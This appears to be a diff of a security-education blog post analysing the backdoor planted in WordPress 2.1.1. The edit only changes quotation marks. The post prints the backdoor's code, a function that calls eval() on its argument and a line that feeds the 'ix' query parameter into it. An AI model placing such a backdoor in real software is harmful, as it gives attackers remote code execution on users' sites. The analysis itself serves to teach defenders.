@@ -27,11 +27,11 @@ Issue Type: Command Injection
 
 Original Code: <a title="Impact" href="http://spotthevuln.com/2010/01/impact/" target="_blank">Found Here</a>
 <h2>Description</h2>
-This example was actually a backdoor someone had planted in WordPress 2.1.1.  Apparently, someone either broke into the wordpress server or hacked a wordpress dev account and inserted this back door.  The back door was simple, create a function which simply calls eval on a arguments passed to it.  The attacker named this function “comment_text_phpfilter()" and the contents of the function are provided below:
+This example was actually a backdoor someone had planted in WordPress 2.1.1.  Apparently, someone either broke into the wordpress server or hacked a wordpress dev account and inserted this back door.  The back door was simple, create a function which simply calls eval on a arguments passed to it.  The attacker named this function "comment_text_phpfilter()" and the contents of the function are provided below:
 <blockquote>function comment_text_phpfilter($filterdata) {
 eval($filterdata);
 }</blockquote>
-Several lines later, the attacker planted a mechanism to call the backdoor.  In this case, the attacker checked for the presense of the “ix" parameter being passed via the querystring.  If the “ix" querystring parameter was present, the value assigned to “ix" would be passed to “comment_text_phpfilter()", which would pass the attacker supplied value to eval().
+Several lines later, the attacker planted a mechanism to call the backdoor.  In this case, the attacker checked for the presense of the "ix" parameter being passed via the querystring.  If the "ix" querystring parameter was present, the value assigned to "ix" would be passed to "comment_text_phpfilter()", which would pass the attacker supplied value to eval().
 <blockquote>if ($_GET["ix"]) { comment_text_phpfilter($_GET["ix"]); }</blockquote>
 <h2>Developers Solution</h2>
 [cce lang="diff"]
